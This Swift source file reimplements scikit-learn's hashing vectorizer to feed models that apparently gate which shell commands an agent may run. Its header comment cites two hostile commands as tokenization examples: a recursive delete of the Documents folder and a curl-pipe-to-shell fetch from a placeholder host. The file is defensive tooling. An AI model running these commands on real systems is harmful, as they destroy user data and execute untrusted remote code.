import Foundation

/// Reproduces scikit-learn's `HashingVectorizer` for the two analyzers the
/// permission-gate models were trained with.
///
/// **EVERY CONSTANT HERE IS A COMPATIBILITY CONSTRAINT, NOT A CHOICE.** The
/// weights were fitted against specific hash buckets, so a port that hashes
/// different strings scores a different model while looking entirely healthy.
/// Two of these bit during the port and neither is visible without the oracle
/// fixture (`CommandGateTests`):
///
/// - **The `\b` anchors in the word token pattern are load-bearing.** Without
///   them `rm -rf ~/Documents` tokenizes as `["rm", "-rf", "/documents"]` where
///   sklearn yields `["rm", "rf", "documents"]`, and every downstream hash
///   differs. The tell is subtle: `curl http://x/s.sh | sh` tokenizes
///   identically either way, so it kept matching while its neighbours drifted.
/// - **Python's `str.split()` splits on ANY whitespace run**, which is not what
///   `split(separator: " ")` does.
///
/// The settings are recorded in the weights file's `feature_pipeline` block so
/// a future retrain cannot silently move them without this file noticing.
enum HashedFeatureVectorizer {

    // MARK: - MurmurHash3 x86_32

    /// scikit-learn hashes the UTF-8 bytes with MurmurHash3 x86_32 at seed 0 and
    /// keeps the SIGNED 32-bit result.
    static func murmur3_32(_ bytes: UnsafeBufferPointer<UInt8>, seed: UInt32 = 0) -> Int32 {
        let c1: UInt32 = 0xcc9e_2d51
        let c2: UInt32 = 0x1b87_3593
        var h1 = seed
        let count = bytes.count
        let blocks = count / 4

        for i in 0..<blocks {
            var k1 = UInt32(bytes[i * 4])
                | UInt32(bytes[i * 4 + 1]) << 8
                | UInt32(bytes[i * 4 + 2]) << 16
                | UInt32(bytes[i * 4 + 3]) << 24
            k1 &*= c1
            k1 = (k1 << 15) | (k1 >> 17)
            k1 &*= c2
            h1 ^= k1
            h1 = (h1 << 13) | (h1 >> 19)
            h1 = h1 &* 5 &+ 0xe654_6b64
        }

        var k1: UInt32 = 0
        let tail = blocks * 4
        let remainder = count & 3
        if remainder >= 3 { k1 ^= UInt32(bytes[tail + 2]) << 16 }
        if remainder >= 2 { k1 ^= UInt32(bytes[tail + 1]) << 8 }
        if remainder >= 1 {
            k1 ^= UInt32(bytes[tail])
            k1 &*= c1
            k1 = (k1 << 15) | (k1 >> 17)
            k1 &*= c2
            h1 ^= k1
        }

        h1 ^= UInt32(truncatingIfNeeded: count)
        h1 ^= h1 >> 16
        h1 &*= 0x85eb_ca6b
        h1 ^= h1 >> 13
        h1 &*= 0xc2b2_ae35
        h1 ^= h1 >> 16
        return Int32(bitPattern: h1)
    }

    /// The bucket a token lands in. `abs` is computed in 64 bits deliberately:
    /// `abs(Int32.min)` is not representable and traps.
    static func bucket(_ token: [UInt8], modulo features: Int) -> Int {
        let hash = token.withUnsafeBufferPointer { murmur3_32($0) }
        return Int(abs(Int64(hash)) % Int64(features))
    }

    // MARK: - Analyzers

    /// `analyzer="char_wb"`: pad each whitespace-separated word with a space on
    /// both sides, then take n-grams inside that padded word only.
    ///
    /// The short-word rule is the fiddly part and it matches sklearn's loop: a
    /// word shorter than `n` is emitted ONCE whole, and larger `n` are then
    /// skipped entirely for that word rather than tried and found empty.
    static func charNgrams(
        _ text: String, _ minN: Int, _ maxN: Int, _ emit: (ArraySlice<UInt8>) -> Void
    ) {
        for word in text.split(whereSeparator: { $0.isWhitespace }) {
            let padded = Array(" \(word) ".utf8)
            for n in minN...maxN {
                if padded.count < n {
                    emit(padded[0...])
                    break
                }
                for start in 0...(padded.count - n) {
                    emit(padded[start..<(start + n)])
                }
                if padded.count == n { break }
            }
        }
    }

    /// `analyzer="word"` with the trained token pattern, then joined n-grams.
    static func wordNgrams(
        _ text: String, _ minN: Int, _ maxN: Int, pattern: NSRegularExpression
    ) -> [String] {
        let ns = text as NSString
        var tokens: [String] = []
        pattern.enumerateMatches(
            in: text, range: NSRange(location: 0, length: ns.length)
        ) { match, _, _ in
            if let match { tokens.append(ns.substring(with: match.range)) }
        }

        var grams: [String] = []
        for n in minN...maxN where tokens.count >= n {
            for start in 0...(tokens.count - n) {
                grams.append(tokens[start..<(start + n)].joined(separator: " "))
            }
        }
        return grams
    }

    // MARK: - Sparse accumulation

    /// One command's features as (index, value) pairs.
    ///
    /// Sparse rather than a dense 24,596-float buffer on purpose. A command
    /// touches roughly 200 features, so this allocates a few KB per call and
    /// needs no shared scratch buffer, which is what makes scoring callable
    /// from any thread with no lock. Dense scratch measured no faster on a
    /// call made once per tool invocation.
    struct SparseVector {
        private(set) var entries: [(index: Int, value: Float)] = []

        mutating func addBlock(
            counts: [Int: Float], offset: Int, l2Normalize: Bool = true
        ) {
            guard !counts.isEmpty else { return }
            var scale: Float = 1
            if l2Normalize {
                let sumSquares = counts.values.reduce(Float(0)) { $0 + $1 * $1 }
                scale = 1 / max(sumSquares.squareRoot(), 1e-12)
            }
            entries.reserveCapacity(entries.count + counts.count)
            for (index, value) in counts {
                entries.append((offset + index, value * scale))
            }
        }

        mutating func addRaw(_ values: [Float], offset: Int) {
            for (i, v) in values.enumerated() where v != 0 {
                entries.append((offset + i, v))
            }
        }

        /// Logit against a dense weight vector, plus the intercept.
        func dot(_ weights: [Float], intercept: Float) -> Double {
            var z = Double(intercept)
            for (index, value) in entries where index < weights.count {
                z += Double(value) * Double(weights[index])
            }
            return z
        }
    }
}
